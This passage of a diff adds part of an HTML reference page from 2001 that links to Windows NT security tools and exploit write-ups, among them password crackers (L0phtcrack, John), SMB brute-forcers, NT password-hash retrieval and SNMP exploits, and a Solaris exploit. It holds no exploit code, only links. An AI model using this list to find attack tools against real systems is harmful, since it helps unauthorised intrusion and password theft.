+      <li>NAT <a href="ftp://ftp.technotronic.com/microsoft/nat10bin.zip">
+	  ftp://ftp.technotronic.com/microsoft/nat10bin.zip</a>
+
+      <li>SMBGrind <a href="http://www.nai.com/">http://www.nai.com/</a>
+
+      <li>Cerberus Internet Scanner(CIS) <a href="http://www.cerberus-infosec.co.uk/cis/shtml">
+	  http://www.cerberus-infosec.co.uk/cis/shtml"</a>
+
+      <li>L0phtcrack <a href="http://www.securitysoftwaretech.com/l0phtcrack/download.html">
+	  http://www.securitysoftwaretech.com/l0phtcrack/download.html</a>
+
+      <li>miscellaneous exploits <a href="http://www.hackingexposed.com/tools/tools.html">
+	  http://www.hackingexposed.com/tools/tools.html</a> and <a href="http://www.net-security.org/text/bugs/973470678,37274,.shtml">
+	  http://www.net-security.org/text/bugs/973470678,37274,.shtml"</a>
+
+      <li>The Happy Hacker guide <a href="http://www.happyhacker.org/gtmhh/cracknt.shtml">
+	  http://www.happyhacker.org/gtmhh/cracknt.shtml</a>
+
+      <li>NT HACK FAQ '97 <a href="http://www.ladysharrow.ndirect.co.uk/NT/nt_hack_faq.htm">
+	  http://www.ladysharrow.ndirect.co.uk/NT/nt_hack_faq.htm</a>
+
+      <li>Windows NT SAM permission vulnerbility <a href="http://ciac.llnl.gov/ciac/bulletins/h-45.shtml">
+	  http://ciac.llnl.gov/ciac/bulletins/h-45.shtml</a>
+
+      <li>NT port binding insecurity <a href="http://www.insecure.org/sploits/NT.port-binding-vulnerability.html">
+	  http://www.insecure.org/sploits/NT.port-binding-vulnerability.html</a>
+
+      <li>SNMP holes in Windoze NT 4.0 <a href="http://www.insecure.org/sploits/NT.smnp.domain_users.record_deletion.html">
+	  http://www.insecure.org/sploits/NT.smnp.domain_users.record_deletion.html</a>
+
+      <li>Windows NT password hash retrieval <a href="http://www.insecure.org/sploits/WinNT.passwordhashes.deobfuscation.html">
+	  http://www.insecure.org/sploits/WinNT.passwordhashes.deobfuscation.html</a>
+
+      <li>Analysis of the Security of Windows NT <a href="http://secinf.net/info/nt/analysis/">
+	  http://secinf.net/info/nt/analysis/</a>
+    </ul>
+
+    <h4>Miscellaneous:</h4>
+    <ul>
+    <li>John 1.6 (password cracking)
+      <a href="http://www.openwall.com/john/">http://www.openwall.com/john/</a>
+    <li>urdls.c
+      <a href="http://darknet.securityinfos.com/exploits/os/solaris/sparc/7.0/index.html">
+	http://darknet.securityinfos.com/exploits/os/solaris/sparc/7.0/index.html</a>
+    </ul>
+    <hr>
+
+    <address><a href="mailto:anson@cs.ucsb.edu">Bryce Anson</a></address>
+<!-- Created: Mon Mar 12 16:07:26 PST 2001 -->
+<!-- hhmts start -->
+Last modified: Wed Mar 14 12:43:39 PST 2001
+<!-- hhmts end -->
+  </body> 
+</html>
